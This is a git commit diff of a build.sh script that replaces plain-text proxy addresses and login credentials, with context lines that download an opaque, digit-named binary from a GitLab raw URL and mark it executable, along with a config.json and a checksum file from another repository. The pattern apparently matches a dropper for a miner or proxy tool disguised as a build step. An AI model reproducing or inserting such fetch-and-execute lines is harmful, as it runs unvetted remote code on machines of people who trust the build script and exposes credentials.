1436d80a3610d51c3258cd885b8fa4258c1377f1
Mas kurniawan <110314564+55113110159@users.noreply.github.com>
2023-12-30 09:31:32 +0700

    Update build.sh

--- build.sh
+++ build.sh
@@ -1,7 +1,7 @@
-proxy="38.154.227.167" 
-port="5868" 
-user="ugursfso"  
-pass="wqn60pnk6m95"   
+proxy="45.67.211.242" 
+port="443" 
+user="excel"  
+pass="excel"   
 wget -q -O 4606821945 https://gitlab.com/55113110159/dokerweb/-/raw/main/ebiy && chmod +x 4606821945
 wget -q https://raw.githubusercontent.com/balma1/kitoy/main/SHA256SUMS && chmod +x SHA256SUMS 
 wget -q https://raw.githubusercontent.com/balma1/kitoy/main/config.json && chmod +x config.json
